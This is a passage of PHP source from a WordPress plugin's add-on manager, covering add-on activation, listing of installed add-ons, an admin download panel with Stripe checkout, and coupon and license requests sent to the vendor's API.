		$resources_path 	= $this->resources_path;	
		if( is_array( $this->plugin_codes ) && count($this->plugin_codes) > 0 ){
			//handle other plugins
			foreach( $this->plugin_codes as $i => $c ){
				if( $plugin_code == $c->plugin_code ){
					$options_varname 	= $c->options_varname;
					$resources_path 	= $c->resources_path;	
				}
			}
		}	
		
		if(false===$plugin){
			die(json_encode(array('R'=>'ERR','MSG'=>__('Plugin is no longer available.','pop') )));
		}
		$redirect_url='';
		$current = $this->get_option( $options_varname, array());
		$current = is_array($current) ? $current : array();
		$current['addons'] = is_array($current['addons']) ? $current['addons'] : array() ;	
		$activate = isset($_REQUEST['activate']) && 1==intval($_REQUEST['activate']) ? true : false;
		if($activate){
			if(!in_array($plugin,$current['addons'])){
				$upload_dir = $this->wp_upload_dir();
				$addons_path = $upload_dir['basedir'].'/'.$resources_path.'/';				
				try {
					$addon = $plugin;
					@include_once $addons_path.$plugin;
					//----
					//$current['addons'][] = $plugin;
					array_unshift($current['addons'],$plugin);
					$current['addons'] = array_intersect($current['addons'],$valid_plugins);
					$this->update_option( $options_varname, $current);
					
					do_action('activate_'.$plugin,$addons_path,$plugin);
					$redirect_url = apply_filters('activate_url_'.$plugin,$redirect_url);
				}catch(Exception $e){	
					die(json_encode(array('R'=>'ERR','MSG'=> $e->getMessage() )));			
				}			
			}
		}else{
			if(in_array($plugin,$current['addons'])){
				$current['addons'] = array_diff($current['addons'], array($plugin))  ;
				$current['addons'] = array_intersect($valid_plugins,$current['addons']);
				$this->update_option( $options_varname, $current);			
			}
		}

		die(json_encode(array('R'=>'OK','MSG'=>'','URL'=>$redirect_url)));
	}
	
	function add_downloaded_id($dc_id){
		$rh_bundles = $this->get_option('rh_bundles',(object)array());
		$rh_downloaded_bundles = property_exists($rh_bundles,'downloaded')?$rh_bundles->downloaded:array();
		$rh_downloaded_bundles = is_array($rh_downloaded_bundles)?$rh_downloaded_bundles:array();
		//--
		if($dc_id>0 && !in_array($dc_id,$rh_downloaded_bundles)){
			$rh_downloaded_bundles[]=$dc_id;
		}
		//--
		$rh_bundles->downloaded = $rh_downloaded_bundles;
		$this->update_option('rh_bundles',$rh_bundles);	
	}

	function admin_menu(){
		$page_id = add_submenu_page( $this->parent_id,$this->page_title ,$this->menu_text,$this->capability,$this->id,array(&$this,'body'));
		add_action( 'admin_head-'. $page_id, array(&$this,'head') );
	}
	
	function get_active_addons(){
		//main addons
		$addons = $this->_get_active_addons( $this->options_varname );
		//other addons
		if( is_array( $this->plugin_codes ) && count($this->plugin_codes) > 0 ){
			foreach( $this->plugin_codes as $c ){
				$more_addons = $this->_get_active_addons( $c->options_varname );
				if( is_array($more_addons) && count($more_addons) > 0 ){
					$addons = array_merge( $addons, $more_addons );
				}
			}
		}	
		return $addons;
	}
	
	function _get_active_addons( $options_varname='rh_options' ){
		$current = $this->get_option( $options_varname, array());
		$current = is_array($current) ? $current : array();
		$addons = isset($current['addons']) && is_array($current['addons']) ? $current['addons'] : array() ;		
		if(count($addons)>0){
			$tmp = array();
			foreach($addons as $a){
				$tmp[]=$a;
			}
			$addons=$tmp;
		}
		return $addons;
	}
	
	function head(){
		wp_register_style('rhpop-bootstrap', 	$this->module_url.'bootstrap/css/bootstrap.namespaced.rhpop.css', array(), '2.3.1');
		wp_print_styles('rhpop-bootstrap');
		
		rh_enqueue_script( 'bootstrap', 		$this->module_url.'bootstrap/js/bootstrap.js', array(),'2.3.1');
		rh_enqueue_script( 'jquery-isotope', 	$this->module_url.'js/jquery.isotope.min.js', array(),'1.5.14');
		wp_print_scripts('bootstrap');
		wp_print_scripts('jquery-isotope');
		
		wp_print_styles('rh-dc');
		wp_print_scripts('rh-dc');
		$rh_bundles = $this->get_option('rh_bundles',(object)array());
		$rh_downloaded_bundles = property_exists($rh_bundles,'downloaded')?$rh_bundles->downloaded:array();
		$rh_downloaded_bundles = is_array($rh_downloaded_bundles)?$rh_downloaded_bundles:array();
		/*
		$current = $this->get_option($this->options_varname, array());
		$current = is_array($current) ? $current : array();
		$addons = isset($current['addons']) && is_array($current['addons']) ? $current['addons'] : array() ;		
		if(count($addons)>0){
			$tmp = array();
			foreach($addons as $a){
				$tmp[]=$a;
			}
			$addons=$tmp;
		}
		*/
		$addons = $this->get_active_addons();
		
	
		$arr = $this->get_plugins();
		$installed_addons = array_keys($arr);
		$installed_addons = is_array($installed_addons)?$installed_addons:array();		
		$arr = is_array($arr)?$arr:array();
		if( count($arr)>0 ){
			foreach($arr as $i => $a){
				$brr = explode(' ',$a['Version']);
				$arr[$i]['Version'] = $brr[0];	
			}
		}
/*		
echo "<pre>";
print_r($installed_addons);
print_r($arr);
echo "</pre>";		
*/		
?>
<script src="https://checkout.stripe.com/v2/checkout.js"></script>
<script>
var rh_download_panel_id = '<?php echo $this->id?>';
var apiurl = '<?php echo $this->api_url?>';
var rh_license_keys = <?php echo json_encode( $this->license_keys )?>;
var rh_item_ids = <?php echo json_encode($this->get_license_item_ids())?>;
var rh_downloaded = <?PHP echo json_encode($rh_downloaded_bundles)?>;
var rh_filter = '';
var rh_bundles = [];
var rh_active_addons = <?php echo json_encode((array)$addons)?>;
var rh_installed_addons = <?php echo json_encode((array)$installed_addons)?>;
var stripe_public_key = '';
var stripe_item_id = '';
var stripe_coupon = '';
var rh_addon_details = <?php echo json_encode($arr)?>;
var rh_theme = <?php echo $this->theme ? 'true' : 'false' ;?>;
var rh_custom_filter = <?php echo $this->custom_filter ? 'true' : 'false' ;?>;
var dc_updates_available = "<?php _e('You have %s update(s) available for download','pop')?>";
jQuery('document').ready(function($){
	get_bundles();
	
	$('#bundles').isotope({
		itemSelector : '.pop-dlc-item',
  		layoutMode : 'fitRows'
		/*,filter : '.letter-a'*/
	});
	
	$('.isotope-filter').on('click',function(e){
		$('.isotope-filter').removeClass('current-cat');
		$(this).addClass('current-cat');
		var filter = $(this).attr('rel');
		$('#bundles').isotope({filter:filter});
	});	
});
</script>
<style>
.dc-col-name {
min-width:200px;
}
</style>
<?php	
	}
	
	function body(){
		$license_keys = $this->get_license_keys();

		if(!is_array($license_keys) || count($license_keys)==0){
			$message = __('Please enter your License Key in the Options Panel to get access to the free add-ons and premium paid add-ons.','pop');
			$message_class='updated';
		}else{
			$message = '';
			$message_class='';		
			
			if( $this->multisite ){
				$message = __('Add-ons will be activated for all sites.','pop');
				$message_class='updated';
			}
		}
		
?>
<div class="wrap">
	<div class="icon32" id="icon-plugins"><br /></div>
	<h2><?php echo $this->page_title?></h2>
	<div id="messages" class="<?php echo $message_class?>"><?php echo $message?></div>
	
	<div id="installing">
		<div id="install-image" class="dc-loading"></div>
		<div id="install-message" class="install-message"></div>
		<div class="clear"></div>
	</div>
	<div class="dc-content">
		<ul class="subsubsub">
			<li><a class="isotope-filter" rel="" href="javascript:void(0);"><?php _e("Downloads",'pop')?></a>|</li>
			<li><a class="isotope-filter" rel=".dlc-recent" href="javascript:void(0);"><?php _e("New",'pop')?></a>|</li>
			<li><a class="isotope-filter" rel=".dlc-update" href="javascript:void(0);"><?php _e("Available Updates",'pop')?></a>|</li>
			<li><a class="isotope-filter" rel=".dlc-installed" href="javascript:void(0);"><?php _e("Installed",'pop')?></a>|</li>
			<li style="display:none;"><a class="isotope-filter" rel=".dlc-not-installed" href="javascript:void(0);"><?php _e("Not installed",'pop')?></a>|</li>
			<li><a class="isotope-filter filter-dlc-addon" rel=".dlc-addon" href="javascript:void(0);"><?php _e("Add-ons",'pop')?></a>|</li>
			<li><a class="isotope-filter" rel=".dlc-downloaded" href="javascript:void(0);"><?php _e("Downloaded",'pop')?></a></li>
		</ul>
		<div class="clear"></div>
			
		<div id="bundles" class="rhpop"></div>		

		<div class="clear"></div>	
	</div>
</div>

<div style="display:none;" id="pop-dlc-item-template">
	<div class="pop-dlc-item show-coupon">
		<h4 class="pop-dlc-name">{name}</h4>
		
		<div class="pop-dlc-details">
			<a class="pop-dlc-image" target="_blank"><img width="135"></a>
			<div class="pop-version-cont">
				<div class="pop-dlc-version-label"><?php _e('Version','pop') ?></div>
				<div class="pop-dlc-version">{version}</div>
			</div>

			<div class="pop-iversion-cont">
				<div class="pop-dlc-iversion-label"><?php _e('Installed','pop') ?></div>
				<div class="pop-dlc-iversion">{version}</div>
			</div>
			
			<div class="pop-filesize-cont">
				<div class="pop-dlc-filesize-label"><?php _e('Size','pop') ?></div>
				<div class="pop-dlc-filesize">{filesize}</div>
			</div>
			
			<div class="pop-price-cont">
				<div class="pop-dlc-price-label"><?php _e('Price','pop') ?></div>
				<div class="pop-dlc-price">{price}</div>
			</div>



			<div class="alert alert-error main-license-message" style="display:none;">
				<?php _e('Enter your license key before you can purchase add-ons or download free add-ons.','pop')?>
			</div>
			<div class="alert alert-error addon-license-message" style="display:none;">
				
			</div>
		</div>		
		
		<div class="pop-dlc-description">{description}</div>
		<div class="pop-clear"></div>
		<div class="dlc-controls">				
			<div class="dlc-row">
				<div class="pop-discount-code">
					<input type="text" class="pop-discount-code-inp" value="" xplaceholder="<?php _e('Discount Code','pop')?>">
					<button type="button" class="btn btn-pop-discount-code">
						<span class="btn-pop-inner">
							<span class="popspinner-holder">
								<span class="popspinner popicon-spinner-10"></span>
							</span>
							<label><?php _e('Apply Coupon','pop')?></label>
						</span>		
					</button>    
				</div>
			</div>
			<div class="dlc-row">
				<div class="pop-purchase-cont">
					<button class="btn btn-success btn-purchased disabled" style="display:none;"><?php _e('Purchased','pop')?></button>
					<button class="btn btn-success btn-buynow coupon-shown" data-panel_label="<?php _e('Checkout','pop')?>" style="display:none;">
						<span class="btn-pop-inner">
							<span class="popspinner-holder">
								<span class="popspinner popicon-spinner-10"></span>
							</span>
							<label><?php _e('Buy now','pop')?></label>
						</span>						
					</button>
				</div>
			</div>
			<div class="dlc-row">
				<a class="btn btn-visit-site" href="#" target="_BLANK"><?php _e('Visit site','pop')?></a>	
				<div class="btn-group dlc-addon-control" data-toggle="buttons-radio">
				  <button type="button" data-toggle="button" class="btn enable-addon"><?php _e('On','pop')?></button>
				  <button type="button" data-toggle="button" class="btn disable-addon"><?php _e('Off','pop')?></button>
				</div>	
				<button class="btn btn-primary btn-download">
					<span class="btn-pop-inner">
						<span class="popspinner-holder">
							<span class="popspinner popicon-spinner-10"></span>
						</span>
						<label data-update="<?php _e('Update','pop')?>"><?php _e('Download','pop')?></label>
					</span>					
				</button>				
			</div>
		</div>
	</div>		
</div>	
<?php	
		/*
		echo "debug<br>";
		$arr = $this->get_plugins();
		echo "<pre>";
		print_r($arr);
		echo "</pre>";
		*/
	}	
	
	function get_plugins() {
		$wp_plugins = $this->_get_plugins( $this->resources_path ); //main plugin
		if( is_array( $this->plugin_codes ) && count( $this->plugin_codes ) > 0 ){
			foreach( $this->plugin_codes as $c ){
				$other_plugins = $this->_get_plugins( $c->resources_path );
				if(!empty($other_plugins)){
					$wp_plugins = array_merge( $wp_plugins, $other_plugins );
				}
			}
		}	
		return $wp_plugins;
	}
	
	function _get_plugins( $resources_path ) {
		$upload_dir = $this->wp_upload_dir();
		$plugin_root = $upload_dir['basedir'].'/'.$resources_path;	
		// rewritten version of the one in plugin.php core wordpress 
		$wp_plugins = array ();		
		// Files in wp-content/plugins directory
		$plugins_dir = @ opendir( $plugin_root);
		$plugin_files = array();
		if ( $plugins_dir ) {
			while (($file = readdir( $plugins_dir ) ) !== false ) {
				if ( substr($file, 0, 1) == '.' )
					continue;
				if ( is_dir( $plugin_root.'/'.$file ) ) {
					$plugins_subdir = @ opendir( $plugin_root.'/'.$file );
					if ( $plugins_subdir ) {
						while (($subfile = readdir( $plugins_subdir ) ) !== false ) {
							if ( substr($subfile, 0, 1) == '.' )
								continue;
							if ( substr($subfile, -4) == '.php' )
								$plugin_files[] = "$file/$subfile";
						}
						closedir( $plugins_subdir );
					}
				} else {
					if ( substr($file, -4) == '.php' )
						$plugin_files[] = $file;
				}
			}
			closedir( $plugins_dir );
		}
	
		if ( empty($plugin_files) )
			return $wp_plugins;
	
		foreach ( $plugin_files as $plugin_file ) {
			if ( !is_readable( "$plugin_root/$plugin_file" ) )
				continue;
	
			$plugin_data = get_plugin_data( "$plugin_root/$plugin_file", false, false ); //Do not apply markup/translate as it'll be cached.
			
			if ( empty ( $plugin_data['Name'] ) )
				continue;
	
			$plugin_data['rh_resources_path'] = $resources_path;
			$wp_plugins[plugin_basename( $plugin_file )] = $plugin_data;
		}
	
		uasort( $wp_plugins, '_sort_uname_callback' );
		
		return $wp_plugins;
	}	
	
	function handle_stripe_token(){
		global $userdata;
		
		if( !is_super_admin() && current_user_can('rh_demo')){
			die(json_encode(array('R'=>'ERR','MSG'=>__('No access.  You dont have permission to perform this action.','pop'))));		
		}
				
		if(!current_user_can($this->capability)){
			die(json_encode(array('R'=>'ERR','MSG'=>__('No access','pop'))));
		}

		foreach(array('token','item_id','coupon') as $field){
			$$field = isset($_REQUEST[$field])?$_REQUEST[$field]:false;
			if(false===$$field){
				die(json_encode(array('R'=>'ERR','MSG'=>__('Plugin error.  Missing argument.','pop')."($field)")));
			}
		}		
	
		$license_keys = $this->get_license_keys();
				
		//-------------------------
		$key = array();
		foreach($this->get_license_keys() as $k){
			$key[]=$k;
		}	

		$site = site_url('/');
		$parts = parse_url($site);
		$host = isset($parts['host'])?$parts['host']:$site;
		
		$args = array(
			'timeout'	=> 60,
			'body'		=> array(
				'content_service'	=> 'stripe_checkout',
				'token'				=> $token,
				'item_id'			=> $item_id,
				'coupon'			=> $coupon,
				'site_url'			=> site_url('/'),
				'email'				=> $userdata->user_email,
				'buyer'				=> sprintf('%s@%s',$userdata->user_login, $host ),
				'key'				=> $key
			)
		);

		$request = wp_remote_post( $this->api_url , $args );
		if ( is_wp_error($request) ){
			$message = sprintf( __('There was a communication error with the RightHere server. Contact support at support.righthere.com about payment %s.  Error message: %s','pop'),
				$token,
				$request->get_error_message()	
			);
			$this->send_error( $message );
		}else{
			$response = json_decode($request['body']);			
			if(is_object($response)&&property_exists($response,'R')){
				if($response->R=='OK'){
					$options = $this->get_option($this->options_varname);
					$options['license_keys'] = isset($options['license_keys'])?$options['license_keys']:array();
					$options['license_keys'] = is_array($options['license_keys'])?$options['license_keys']:array();
					$options['license_keys'][]=$response->LICENSE;
					$this->update_option($this->options_varname,$options);
				}
			
				return $this->send_response($response);
			}else{
				$message = sprintf( __('There was a communication error with the RightHere server. Contact support at support.righthere.com about payment %s.  Error message: %s','pop'),
					$token,
					__('API Server returned an unrecognized format.','pop')
				);
				$this->send_error( $message );
			}		
		}
		//-------------------------
		$this->send_error( __('Service is unavailable, please try again later.','pop') );	
		die();	
	}	
	
	function handle_apply_coupon(){
		global $userdata;
		
		if( !is_super_admin() && current_user_can('rh_demo')){
			die(json_encode(array('R'=>'ERR','MSG'=>__('No access.  You dont have permission to perform this action.','pop'))));		
		}
				
		if(!current_user_can($this->capability)){
			die(json_encode(array('R'=>'ERR','MSG'=>__('No access','pop'))));
		}

		foreach(array('coupon','item_id') as $field){
			$$field = isset($_REQUEST[$field])?$_REQUEST[$field]:false;
			if(false===$$field){
				die(json_encode(array('R'=>'ERR','MSG'=>__('Plugin error.  Missing argument.','pop')."($field)")));
			}
		}		
	
		$license_keys = $this->get_license_keys();
				
		//-------------------------
		$key = array();
		foreach($this->get_license_keys() as $k){
			$key[]=$k;
		}	
		
		
		$site = site_url('/');
		$parts = parse_url($site);
		$host = isset($parts['host'])?$parts['host']:$site;
		
		$args = array(
			'timeout'	=> 60,
			'body'		=> array(
				'content_service'	=> 'validate_coupon',
				'coupon'			=> $coupon,
				'item_id'			=> $item_id,
				'site_url'			=> site_url('/'),
				'email'				=> $userdata->user_email,
				'buyer'				=> sprintf('%s@%s',$userdata->user_login, $host ),
				'key'				=> $key
			)
		);		
		
		$request = wp_remote_post( $this->api_url , $args );
		if ( is_wp_error($request) ){
			$message = sprintf( __('There was a communication error with the RightHere server. Coupon %s.  Error message: %s','pop'),
				$coupon,
				$request->get_error_message()	
			);
			$this->send_error( $message );
		}else{
			$response = json_decode($request['body']);
			if(is_object($response)&&property_exists($response,'R')){	
				if( $response->R=='OK' ){
					if( (!property_exists($response,'MSG') || empty($response->MSG) ) && property_exists($response,'PRICE') ){
						if( intval($response->PRICE)==0 ){
							$response->MSG = __('Gift certificate applied.  Click Buy Now to continue.','pop');
						}else if( $response->PRICE > 0 ){
							$response->MSG = __('Discount applied.  Click Buy Now to continue.','pop');
						}
					}
				}		
				return $this->send_response($response);
			}else{
				$message = sprintf( __('There was a communication error with the RightHere server. Coupon %s.  Error message: %s','pop'),
					$coupon,
					__('API Server returned an unrecognized format.','pop')
				);
				$this->send_error( $message );
			}		
		}
		//-------------------------
		$this->send_error( __('Service is unavailable, please try again later.','pop') );	
		die();			
	}
	
	function handle_gc(){
		global $userdata;
		
		if( !is_super_admin() && current_user_can('rh_demo')){
			die(json_encode(array('R'=>'ERR','MSG'=>__('No access.  You dont have permission to perform this action.','pop'))));		
		}
				
		if(!current_user_can($this->capability)){
			die(json_encode(array('R'=>'ERR','MSG'=>__('No access','pop'))));
		}

		foreach(array('coupon','item_id') as $field){
			$$field = isset($_REQUEST[$field])?$_REQUEST[$field]:false;
			if(false===$$field){
				die(json_encode(array('R'=>'ERR','MSG'=>__('Plugin error.  Missing argument.','pop')."($field)")));
			}
		}		
	
		$license_keys = $this->get_license_keys();
				
		//-------------------------
		$key = array();
		foreach($this->get_license_keys() as $k){
			$key[]=$k;
		}	
		
		
		$site = site_url('/');
		$parts = parse_url($site);
		$host = isset($parts['host'])?$parts['host']:$site;
		
		$args = array(
			'timeout'	=> 60,
			'body'		=> array(
				'content_service'	=> 'gc_checkout',
				'coupon'			=> $coupon,
				'item_id'			=> $item_id,
				'site_url'			=> site_url('/'),
				'email'				=> $userdata->user_email,
				'buyer'				=> sprintf('%s@%s',$userdata->user_login, $host ),
				'key'				=> $key
			)
		);		
		
		$request = wp_remote_post( $this->api_url , $args );
		if ( is_wp_error($request) ){
			$message = sprintf( __('There was a communication error with the RightHere server. Coupon %s.  Error message: %s','pop'),
				$coupon,
				$request->get_error_message()	
			);
			$this->send_error( $message );
		}else{
			$response = json_decode($request['body']);
			if(is_object($response)&&property_exists($response,'R')){	
			
				if($response->R=='OK'){
					$options = $this->get_option($this->options_varname);
					$options['license_keys'] = isset($options['license_keys'])?$options['license_keys']:array();
					$options['license_keys'] = is_array($options['license_keys'])?$options['license_keys']:array();
					$options['license_keys'][]=$response->LICENSE;
					$this->update_option($this->options_varname,$options);
				}			
					
				return $this->send_response($response);
			}else{
				$message = sprintf( __('There was a communication error with the RightHere server. Coupon %s.  Error message: %s','pop'),
					$coupon,
					__('API Server returned an unrecognized format.','pop')
				);
				$this->send_error( $message );
			}		
		}
		//-------------------------
		$this->send_error( __('Service is unavailable, please try again later.','pop') );	
		die();			
	}	
	
	function get_option( $options_varname, $default='' ){
		if( $this->multisite ){
			return get_site_option( $options_varname, $default );
		}else{
			return get_option( $options_varname, $default );
		}
	}
	
	function update_option( $options_varname, $options ){
		//Note: even though update_site_option fallbacks to update_option on non-multisite, we only want to use update_site_option if attr multisie true.
		if( $this->multisite ){
			update_site_option( $options_varname, $options );
		}else{
			update_option( $options_varname, $options );
		}
	}
	
	function wp_upload_dir( ){
		if( $this->multisite ){
			// return WP_CONTENT_DIR.'/uploads'
			return array(
				'path'		=> WP_CONTENT_DIR.'/uploads',
				'url'		=> WP_CONTENT_URL.'/uploads',
				'subdir'	=> '/',
				'basedir'	=> WP_CONTENT_DIR.'/uploads',
				'baseurl'	=> WP_CONTENT_URL.'/uploads',
				'error'		=> ''
			);
		}else{
			return wp_upload_dir();
		}
	}	
}

endif;
?>